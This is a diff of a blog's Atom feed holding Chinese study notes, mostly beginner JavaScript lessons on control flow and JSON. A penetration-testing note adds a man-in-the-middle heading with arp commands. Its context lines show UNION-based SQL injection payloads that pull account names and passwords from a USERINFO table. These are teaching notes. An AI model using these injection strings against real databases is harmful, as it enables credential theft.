@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://uknow.top/"/>
-  <updated>2016-11-20T16:54:20.333Z</updated>
+  <updated>2016-11-21T15:42:30.827Z</updated>
   <id>http://uknow.top/</id>
   
   <author>
@@ -20,7 +20,7 @@
     <link href="http://uknow.top/posts/notes/%E5%AE%89%E5%85%A8%E7%89%9B%EF%BC%9A%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E4%B8%8E%E6%B7%B1%E5%BA%A6%E9%98%B2%E5%BE%A1%E6%95%B4%E7%90%86%E7%AC%94%E8%AE%B0.html"/>
     <id>http://uknow.top/posts/notes/安全牛：网络渗透与深度防御整理笔记.html</id>
     <published>2016-11-20T11:06:17.000Z</published>
-    <updated>2016-11-20T16:54:20.333Z</updated>
+    <updated>2016-11-21T15:42:30.827Z</updated>
     
     <content type="html"><![CDATA[<p><img src="http://obr4sfdq7.bkt.clouddn.com/1622444d95f1718371.png" alt="安全牛"></p>
 <a id="more"></a>
@@ -165,6 +165,8 @@ id=-1 union select database()
 <h3 id="查看表的记录数"><a href="#查看表的记录数" class="headerlink" title="查看表的记录数"></a>查看表的记录数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">id=-1 union select null,null,null,null,null,null,null,null,count(*)||&apos;&apos;,null,null,null,null from USERINFO</div></pre></td></tr></table></figure>
 <h3 id="查看第一条记录"><a href="#查看第一条记录" class="headerlink" title="查看第一条记录"></a>查看第一条记录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">id=-1 union select null,null,null,null,null,null,null,null,USER_ACCOUNT,null,null,null,null from(select rownum aa,USER_ACCOUNT from USERINFO)where aa=1</div></pre></td></tr></table></figure>
 <h3 id="查看密码"><a href="#查看密码" class="headerlink" title="查看密码"></a>查看密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">id=-1 union select null,null,null,null,null,null,null,null,PASSWORD,null,null,null,null from(select rownum aa,PASSWORD from USERINFO)where aa=1</div></pre></td></tr></table></figure>
+<h2 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h2><p>会话劫持</p>
+<p>arp -a:显示本地arp缓存<br>arp -d * 清空缓存<br>arp -s 绑定</p>
 ]]></content>
     
     <summary type="html">
@@ -183,7 +185,7 @@ id=-1 union select database()
     <link href="http://uknow.top/posts/notes/%E6%99%BA%E8%83%BD%E7%A4%BE%EF%BC%9AJavaScript%E6%95%99%E7%A8%8B-%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A%E8%A7%86%E9%A2%91%E6%95%B4%E7%90%86%E7%AC%94%E8%AE%B0.html"/>
     <id>http://uknow.top/posts/notes/智能社：JavaScript教程-从入门到精通视频整理笔记.html</id>
     <published>2016-11-19T01:35:41.000Z</published>
-    <updated>2016-11-20T16:55:03.140Z</updated>
+    <updated>2016-11-22T17:06:08.022Z</updated>
     
     <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
 <p><img src="http://obr4sfdq7.bkt.clouddn.com/vaBq86vyU_oNsNHGme3T1HWSdJ6vvn6X5xAgtgVzRWvEAQAA_wAAAEpQ.jpg" alt="javascript"></p>
@@ -452,6 +454,52 @@ var iNum1 = parseInt(&quot;red&quot;);    //返回 NaN  Not a number
 </tr>
 </tbody>
 </table>
+<h2 id="程序流程控制"><a href="#程序流程控制" class="headerlink" title="程序流程控制"></a>程序流程控制</h2><h3 id="判断-if、switch、"><a href="#判断-if、switch、" class="headerlink" title="判断(if、switch、?:)"></a>判断(if、switch、?:)</h3><ul>
+<li><p>if</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">if()</div><div class="line">&#123;</div><div class="line">&#125;</div><div class="line">else</div><div class="line">&#123;</div><div class="line">&#125;</div><div class="line"></div><div class="line">if(条件1)</div><div class="line">&#123;</div><div class="line">	语句1</div><div class="line">&#125;</div><div class="line">else if(条件2)</div><div class="line">&#123;</div><div class="line">	语句2</div><div class="line">&#125;</div><div class="line">else</div><div class="line">&#123;</div><div class="line">	语句n</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+<li><p>switch</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">switch(变量)</div><div class="line">&#123;</div><div class="line">	case 值1:</div><div class="line">		语句1</div><div class="line">		break;</div><div class="line">	case 值2:</div><div class="line">		语句2</div><div class="line">		break;</div><div class="line">	......</div><div class="line">	default:</div><div class="line">		语句n</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+<li><p>三目条件运算符</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">条件?语句1:语句2</div><div class="line"></div><div class="line">if(条件)</div><div class="line">&#123;</div><div class="line">	语句1</div><div class="line">&#125;</div><div class="line">else</div><div class="line">&#123;</div><div class="line">	语句2</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="循环-while、for"><a href="#循环-while、for" class="headerlink" title="循环(while、for)"></a>循环(while、for)</h3><ul>
+<li>while、for<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">while(条件)</div><div class="line">&#123;</div><div class="line">	语句</div><div class="line">&#125;</div><div class="line">   </div><div class="line">   </div><div class="line">   for循环</div><div class="line"></div><div class="line">for(初始化;条件;自增)</div><div class="line">&#123;</div><div class="line">	语句</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="跳出-break、continue"><a href="#跳出-break、continue" class="headerlink" title="跳出(break、continue)"></a>跳出(break、continue)</h3><ul>
+<li><p>continue 语句中断循环中的迭代，如果出现了指定的条件，然后继续循环中的下一个迭代。</p>
+</li>
+<li><p>break 语句可用于跳出循环。break 语句跳出循环后，会继续执行该循环之后的代码（如果有的话）</p>
+</li>
+</ul>
+<h3 id="什么是真、什么是假"><a href="#什么是真、什么是假" class="headerlink" title="什么是真、什么是假"></a>什么是真、什么是假</h3><ul>
+<li>真：true、非零数字、非空字符串、非空对象</li>
+<li>假：false、数字零、空字符串、空对象、undefined</li>
+</ul>
+<h2 id="Json"><a href="#Json" class="headerlink" title="Json"></a>Json</h2><h3 id="Json-1"><a href="#Json-1" class="headerlink" title="Json"></a>Json</h3><ul>
+<li><p>JSON：JavaScript 对象表示法（JavaScript Object Notation）。</p>
+</li>
+<li><p>JSON 是存储和交换文本信息的语法。类似 XML。</p>
+</li>
+<li><p>JSON 比 XML 更小、更快，更易解析。</p>
+</li>
+</ul>
+<h3 id="Json与数组区别"><a href="#Json与数组区别" class="headerlink" title="Json与数组区别"></a>Json与数组区别</h3><ul>
+<li><p>下标：Json下标为字符，数组下标为数字</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">var json=&#123;a: 12, b: 5, c: 7&#125;;</div><div class="line">var arr=[12, 5, 7];</div><div class="line"></div><div class="line">alert(json[&apos;a&apos;]);</div><div class="line">alert(arr[0]);</div></pre></td></tr></table></figure>
+</li>
+<li><p>.length</p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">alert(json.length);     错误，json没有length</div><div class="line">alert(arr.length);	  正确，而数组有length</div></pre></td></tr></table></figure>
+<ul>
+<li>循环</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">for(var i=0;i&lt;arr.length;i++)</div><div class="line">&#123;</div><div class="line">	alert(&apos;第&apos;+i+&apos;个东西：&apos;+arr[i]);</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">for(var i in arr)</div><div class="line">&#123;</div><div class="line">	alert(&apos;第&apos;+i+&apos;个东西：&apos;+arr[i]);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h3 id="Json和for-in"><a href="#Json和for-in" class="headerlink" title="Json和for in"></a>Json和for in</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">for(var i in json)</div><div class="line">&#123;</div><div class="line">	alert(&apos;第&apos;+i+&apos;个东西：&apos;+json[i]);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
 ]]></content>
     
     <summary type="html">
@@ -1859,7 +1907,7 @@ var iNum1 = parseInt(&quot;red&quot;);    //返回 NaN  Not a number
     <link href="http://uknow.top/posts/notes/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80%E4%B8%8E%E5%AE%9E%E4%BE%8B.html"/>
     <id>http://uknow.top/posts/notes/MySQL数据库基础与实例.html</id>
     <published>2016-09-02T13:10:35.000Z</published>
-    <updated>2016-11-19T04:50:04.556Z</updated>
+    <updated>2016-11-22T16:36:38.090Z</updated>
     
     <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
 <h1 id="MySQL基础知识"><a href="#MySQL基础知识" class="headerlink" title="MySQL基础知识"></a>MySQL基础知识</h1><p>MySQL是最受欢迎的开源关系数据库管理系统，有瑞典MySQL AB公司开发。2008年1月MySQL被美国的SUN公司收购，2009年4月SUN公司又被美国的甲骨文（Oracle）公司收购。</p>
